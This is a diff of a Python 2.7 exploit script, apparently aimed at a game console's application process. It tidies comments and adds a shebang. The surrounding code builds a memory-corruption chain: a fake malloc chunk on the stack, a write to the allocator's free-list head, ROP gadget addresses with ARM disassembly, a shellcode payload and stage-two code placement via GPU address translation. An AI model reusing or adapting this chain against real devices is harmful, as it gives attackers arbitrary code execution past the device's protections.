@@ -1,3 +1,5 @@
+#!/usr/bin/python2.7
+
 from struct import pack
 from subprocess import call
 
@@ -22,28 +24,6 @@ def get_shellcode():
     return payload
 
 """
-u32 i don't know
-u32 size
-u32 prev
-u32 next
-
-goal:
-{
-  no idea
-  >= desired size
-  0
-  0
-}
-
-2nd dword is current chunk size
-3rd needs to be writable memory
-4th dword starting at stack chunk is next pointer
-
-2nd needs to be >= the desired size (I chose ~1024? for my ROP payload.)
-4th ideally is 0 so it finds only the first chunk
-"""
-
-"""
 fake malloc chunk, located on our stack :)
 
 2nd dword needs to be big enough, and it is
@@ -65,9 +45,8 @@ where = malloc_free_list_head
 
 """
 we don't want the corrupted chunk to get added to the free
-list when its freed, so put fake size data in the header
-so it doesn't get added. not 100% if that's what this is,
-my RE could be off
+list when it's freed, so put fake size data in the header
+so it doesn't get added.
 """
 
 start = 0x140018AF
@@ -107,7 +86,7 @@ sleep_gadget = 0x001B5A5C
 .text:002E295C                 LDR             R0, =dword_30CF2C
 .text:002E2960                 MOV             R6, R1
 .text:002E2964                 LDR             R5, [R0]
-.text:002E2968                 BL              unknown_libname_289 ; Unnamed sample library
+.text:002E2968                 BL              unknown_libname_289
 .text:002E296C                 MOV             R3, R6
 .text:002E2970                 MOV             R2, R4
 .text:002E2974                 MOV             R1, R5
@@ -138,23 +117,11 @@ pop_r0_pc = 0x002e6f80 # USA. Update required for non-USA.
 #.text:0022B6C8                 LDMFD           SP!, {R1,PC}
 pop_r1_pc = 0x0022B6C8
 
-"""
-arm-none-eabi-gcc -x assembler-with-cpp -nostartfiles -nostdlib -o stage2.o stage2.s
-arm-none-eabi-objcopy -O binary stage2.o
-"""
-
 payload = get_shellcode()
 payload_stack_addr = 0x15D630C8
 
 # avoid 0x2f6000
 stage2_code_va = 0x002F5D00
-
-"""
-some gadgets:
-0x002260E0: sleep function
-0x002E2950: flushdatacache function
-0x002E96FC: enqueuegpucommand
-"""
 
 # 0021462C                 LDMFD           SP!, {R2-R6,PC}
 pop_r2_thru_r6_pc = 0x0021462C
@@ -165,7 +132,8 @@ def pa_to_gpu(pa):
 def gpu_to_pa(gpua):
   return gpua + 0x0C000000
 
-# 16:06:09 @yellows8 | "> readmem:11usr=CtrApp 0x002F5d00 0x100" "Using physical address: 0x27bf5d00 (in_address = 0x002f5d00)"
+# 16:06:09 @yellows8 | "> readmem:11usr=CtrApp 0x002F5d00 0x100"
+# "Using physical address: 0x27bf5d00 (in_address = 0x002f5d00)"
 def code_va_to_pa(va):
   return va + 0x27900000
 
